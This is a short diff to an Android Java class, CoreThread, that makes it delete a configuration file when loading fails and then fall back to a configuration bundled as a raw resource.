@@ -284,11 +284,14 @@ public class CoreThread extends Activity implements Runnable {
 			loaded = conf.LoadConfiguration();
 
 			debug.info("Conf file loaded: " + loaded);
-
+			if (!loaded) {
+				file.delete();
+			}
 		}
 
 		// tries to load the resource conf
 		if (!loaded) {
+
 			// Open conf from resources and load it into resource
 			final byte[] resource = Utils.InputStreamToBuffer(resources
 					.openRawResource(R.raw.config), 8); // config.bin
